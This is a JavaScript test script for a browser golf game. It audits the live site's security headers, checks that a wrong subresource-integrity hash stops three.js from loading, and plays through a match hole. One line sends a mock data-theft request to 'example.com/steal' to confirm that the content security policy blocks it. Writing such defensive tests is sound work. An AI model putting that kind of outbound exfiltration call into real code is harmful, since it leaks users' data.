// Audit 3.9: the game under the live site's headers (vercel.json, which the dev server sends too): the content security
// policy blocks nothing the game needs (the probe prints any block under PROBLEMS as "SECURITY ..."), and three.js
// loads through the import map's integrity check.
//   node tools/test/probe.js http://127.0.0.1:8090/ - @tools/test/sec-headers.js 0 audit-headers
// And the other way round: a copy of the page with a wrong hash must NOT run three.js:
//   node tools/test/sec-headers.js --bad   (writes tools/test/out/bad-sri.html), then
//   node tools/test/probe.js http://127.0.0.1:8090/tools/test/out/bad-sri.html - "document.getElementById('boot').textContent + ' · game loaded: ' + !!window.__golf" 0 audit-badsri
if (typeof window === 'undefined') {
  const fs = require('fs'), path = require('path');
  const src = fs.readFileSync(path.join(__dirname, '..', '..', 'index.html'), 'utf8');
  fs.mkdirSync(path.join(__dirname, 'out'), { recursive: true });
  fs.writeFileSync(path.join(__dirname, 'out', 'bad-sri.html'), src.replace(/"sha384-[^"]+"/, '"sha384-' + 'A'.repeat(64) + '"'));
  console.log('wrote tools/test/out/bad-sri.html');
} else {
  (async () => {
    const sleep = (ms) => new Promise((r) => setTimeout(r, ms)), $ = (id) => document.getElementById(id);
    for (let i = 0; i < 50 && !window.__golf; i++) await sleep(200);
    localStorage.clear(); window.confirm = () => true; const g = window.__golf, out = [];
    const h = await fetch('/'), csp = h.headers.get('content-security-policy') || '';
    out.push(`headers: CSP ${csp ? 'on' : 'MISSING'} (connect-src ${(/connect-src ([^;]+)/.exec(csp) || [])[1]}), nosniff ${h.headers.get('x-content-type-options')}, frames ${h.headers.get('x-frame-options')}`);
    out.push(`three.js loaded through the import map: ${!!(g && g.scene && g.scene.isScene)}`);
    // the main paths: the clubhouse, a match hole, the scorecard, the leaderboard
    $('hmGuest').click(); await sleep(150); document.querySelector('[data-h=career]').click(); await sleep(200);
    $('chName').value = 'TESTER'; $('chCreate').click(); await sleep(400);
    document.querySelector('[data-go=match]').click(); await sleep(300);
    $('cmGo').click(); await sleep(500); $('riStart').click();
    for (let k = 0; k < 40 && !g.tossOpen; k++) await sleep(50);
    g.career.match.toss = 'me'; g.closeToss(); await sleep(300);
    g.npc.done = true; g.hp.strokes = 4; g.hp.putts = 2; g.finishHole(); await sleep(600);
    const lb = await fetch('/api/leaderboard?holes=9');
    out.push(`played a match hole (card shown ${$('scorecard').classList.contains('on')}); the leaderboard API ${lb.status}`);
    // a request to another site is blocked by connect-src (what a script injected into the page could have used)
    let blocked = false;
    try { await fetch('https://example.com/steal?x=1'); } catch { blocked = true; }
    out.push(`a request to another site from the page: ${blocked ? 'blocked' : 'ALLOWED'}`);
    return out.join('\n');
  })();
}
